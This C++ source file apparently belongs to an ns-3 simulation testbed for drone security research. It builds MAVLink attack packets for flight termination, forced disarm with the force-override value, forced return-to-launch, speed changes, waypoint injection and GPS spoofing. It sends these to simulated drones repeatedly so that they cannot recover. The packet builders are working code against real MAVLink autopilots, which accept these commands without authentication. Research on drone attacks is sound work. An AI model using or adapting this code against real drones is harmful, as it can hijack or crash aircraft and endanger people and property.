// attacks.cc
#include "attacks.h"

#include "ns3/wifi-module.h"
#include "ns3/mobility-module.h"
#include "ns3/applications-module.h"
#include "ns3/udp-socket-factory.h"
#include "ns3/netanim-module.h"

#include <common/mavlink.h>
#include <cmath>
#include <cstring>
#include <algorithm>
#include <sstream>

NS_LOG_COMPONENT_DEFINE("Attacks");

// - CreateMavlinkMissionPacket
// Create MAVLink Mission Item packet that sends a waypoint command to a target drone
std::vector<uint8_t> CreateMavlinkMissionPacket(uint8_t target_system, uint8_t target_component,
                                         float lat, float lon, float alt) {
    mavlink_message_t msg;
    uint8_t system_id = 1;   // Drone 0 (sender)
    uint8_t component_id = 1; // Component ID

    // Initialize mission item structure
    mavlink_mission_item_t mission_item = {0};
    mission_item.target_system = target_system;
    mission_item.target_component = target_component;
    mission_item.seq = 0;
    mission_item.frame = MAV_FRAME_GLOBAL_RELATIVE_ALT;
    mission_item.command = MAV_CMD_NAV_WAYPOINT;
    mission_item.current = 0;
    mission_item.autocontinue = 1;
    mission_item.param1 = 0; // Hold time (seconds)
    mission_item.param2 = 0; // Acceptance radius (meters)
    mission_item.param3 = 0; // Pass through waypoint
    mission_item.param4 = 0; // Yaw angle (NaN for unchanged)
    mission_item.x = lat;
    mission_item.y = lon;
    mission_item.z = alt;

    // Pack the message , Encode the MAVLink message 
    mavlink_msg_mission_item_encode(system_id, component_id, &msg, &mission_item);

    // Serialize to byte vector
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    return std::vector<uint8_t>(buffer, buffer + len);
}

// - CreateFakeGpsPacket
std::vector<uint8_t> CreateFakeGpsPacket(uint8_t droneId, double lat, double lon, double alt) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker ID
    uint8_t component_id = 0;
    
    mavlink_gps_raw_int_t gps = {};
    gps.time_usec = 0;
    gps.fix_type = 3;  // 3D fix
    gps.lat = static_cast<int32_t>(lat * 1e7);
    gps.lon = static_cast<int32_t>(lon * 1e7);
    gps.alt = static_cast<int32_t>(alt * 1000);  // mm
    gps.eph = 100;   // HDOP
    gps.epv = 100;   // VDOP
    gps.vel = 0;
    gps.cog = 0;
    gps.satellites_visible = 12;

    mavlink_msg_gps_raw_int_encode(system_id, component_id, &msg, &gps);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    
    // Add drone ID prefix for ZMQ compatibility
    std::vector<uint8_t> packet = {droneId};
    packet.insert(packet.end(), buffer, buffer + len);
    
    return packet;
}

// - CreateChangeSpeedPacket
// Create a change speed command packet that will be used by attacker to change the speed of drones and  make it slow or fast
std::vector<uint8_t> CreateChangeSpeedPacket(uint8_t target_system, float speedType, float speed) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker system ID (typically GCS)
    uint8_t component_id = 0;  // Component ID

    mavlink_command_long_t cmd = {};
    cmd.target_system    = target_system;
    cmd.target_component = 0;
    cmd.command          = MAV_CMD_DO_CHANGE_SPEED;
    cmd.confirmation     = 0;

    // MAV_CMD_DO_CHANGE_SPEED params
    cmd.param1 = speedType; // 0 = airspeed, 1 = groundspeed
    cmd.param2 = speed;     // Speed in m/s
    cmd.param3 = 0;         // Throttle (-1 = no change)
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    // Encode MAVLink message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    // Convert to raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    return std::vector<uint8_t>(buffer, buffer + len);
}

// - CreateForcedReturnHomePacket
// This is a force return home command that will be used by attacker to make drones return home by sendting RTL mode change
std::vector<uint8_t> CreateForcedReturnHomePacket(uint8_t target_system) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker / GCS ID
    uint8_t component_id = 0;  // Component ID

    // ArduPilot's RTL mode is custom_mode = 6 in Copter firmware
    uint8_t base_mode   = MAV_MODE_FLAG_CUSTOM_MODE_ENABLED;
    uint32_t custom_mode = 6; // RTL in ArduCopter

    mavlink_set_mode_t set_mode = {};
    set_mode.target_system = target_system;
    set_mode.base_mode = base_mode;
    set_mode.custom_mode = custom_mode;

    mavlink_msg_set_mode_encode(system_id, component_id, &msg, &set_mode);

    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    return std::vector<uint8_t>(buffer, buffer + len);
}
// - CreateForcedDisarmPacket
// This is a force disarm command that will be used by attacker to disturb drones
std::vector<uint8_t> CreateForcedDisarmPacket(uint8_t target_system) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker / GCS ID
    uint8_t component_id = 0;  

    mavlink_command_long_t cmd = {};
    cmd.target_system = target_system;
    cmd.target_component = 0;  // Target autopilot
    cmd.command = MAV_CMD_COMPONENT_ARM_DISARM; // Disarm/Arm command
    cmd.confirmation = 0;
    cmd.param1 = 0.0;    // 0 = disarm, 1 = arm
    cmd.param2 = 21196;  // Force override magic number
    cmd.param3 = 0;
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    return std::vector<uint8_t>(buffer, buffer + len);
}
// - CreateFlightTerminationPacket
// This can be extended to include more mavlink commands and packets for different attack senarios 
std::vector<uint8_t> CreateFlightTerminationPacket(uint8_t target_system) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker system ID 
    // system ID 255 is generally used as a "GCS" (Ground Control Station) 
    uint8_t component_id = 0;  // Component ID
    mavlink_command_long_t cmd = {};
    cmd.target_system = target_system;
    cmd.target_component = 0;
    cmd.command = MAV_CMD_DO_FLIGHTTERMINATION;
    cmd.confirmation = 0;
    cmd.param1 = 1.0;  // Termination enabled (1 = true)
    cmd.param2 = 0;
    cmd.param3 = 0;
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    return std::vector<uint8_t>(buffer, buffer + len);
}
// - ExecuteFlightTerminationAttack
// Function to execute flight termination attack on drones 1 and 2
void ExecuteFlightTerminationAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateFlightTerminationPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateFlightTerminationPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteFlightTerminationAttack, socket);
    }
}

// - ExecuteForceDisarmAttack
// Function to execute force disarm attack on drones 1 and 2
void ExecuteForceDisarmAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedDisarmPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedDisarmPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceDisarmAttack, socket);
    }
}

// - ExecuteForceRTLAttack
// Function to execute force disarm attack on drones 1 and 2
void ExecuteForceRTLAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedReturnHomePacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedReturnHomePacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceRTLAttack, socket);
    }
}

// Execute GPS spoofing attack
void ExecuteGpsSpoofingAttack(Ptr<Socket> socket) {
    // Spoof position 1km away from real location
    const double spoofOffset = 0.01;  // ~1.1km at equator
    double fakeLat = s_refLat + spoofOffset;
    double fakeLon = s_refLon + spoofOffset;
    double fakeAlt = 100;  // meters

    for (uint8_t droneId = 1; droneId <= 2; droneId++) {
        std::vector<uint8_t> fakeGps = CreateFakeGpsPacket(droneId, fakeLat, fakeLon, fakeAlt);
        Ptr<Packet> packet = Create<Packet>(fakeGps.data(), fakeGps.size());
        socket->SendTo(packet, 0, InetSocketAddress(droneIpAddresses[droneId], 20000));
    }
    
    NS_LOG_INFO("Attacker sent fake GPS data at " << Simulator::Now().GetSeconds() << "s");
    
    // Schedule continuous spoofing
    Simulator::Schedule(Seconds(0.2), &ExecuteGpsSpoofingAttack, socket);
}

// - SendWaypointPairFromAttacker
void SendWaypointPairFromAttacker(int pairIndex) {
    // Use the attacker node to send mission items, similar to SendWaypointPairFromDrone0 but with more waypoints
    Ptr<Node> attackerNode = Attacker.Get(0);
    Ptr<Socket> socket = Socket::CreateSocket(attackerNode, UdpSocketFactory::GetTypeId());
    socket->Bind();

    // Define more waypoints for each drone
    static const std::vector<std::tuple<float, float, float>> drone1_waypoints = {
        {50, 60, 30}, {10, 30, 30}, {60, 10, 30}, {70, 80, 40}, {90, 100, 50}, {110, 120, 60}, {130, 140, 70}
    };
    static const std::vector<std::tuple<float, float, float>> drone2_waypoints = {
        {50, 60, 30}, {20, 60, 30}, {20, 30, 30}, {80, 20, 40}, {100, 90, 50}, {120, 110, 60}, {140, 130, 70}
    };

    // Check if the requested waypoint pair index is valid
    if (pairIndex < 0 || pairIndex >= static_cast<int>(drone1_waypoints.size())) return;

    // Send all waypoints up to pairIndex to both drones
    for (int i = 0; i <= pairIndex; ++i) {
        auto [lat1, lon1, alt1] = drone1_waypoints[i];
        auto [lat2, lon2, alt2] = drone2_waypoints[i];

        std::vector<uint8_t> pkt1 = CreateMavlinkMissionPacket(2, 0, lat1, lon1, alt1);
        std::vector<uint8_t> pkt2 = CreateMavlinkMissionPacket(3, 0, lat2, lon2, alt2);

        Ptr<Packet> packet1 = Create<Packet>(pkt1.data(), pkt1.size());
        Ptr<Packet> packet2 = Create<Packet>(pkt2.data(), pkt2.size());

        socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
        socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));

        if (g_commandPublisher) {
            zmq::message_t zmqMsg1(pkt1.data(), pkt1.size());
            zmq::message_t zmqMsg2(pkt2.data(), pkt2.size());
            g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
            g_commandPublisher->send(zmqMsg2, zmq::send_flags::sndmore);
        }
    }
    // Log the sending event with the current simulation time
    NS_LOG_INFO("Attacker sent " << (pairIndex+1) << " waypoint pairs to drones at " << Simulator::Now().GetSeconds() << "s");
}
//
// (Do not alter code or comments; just move them here.)
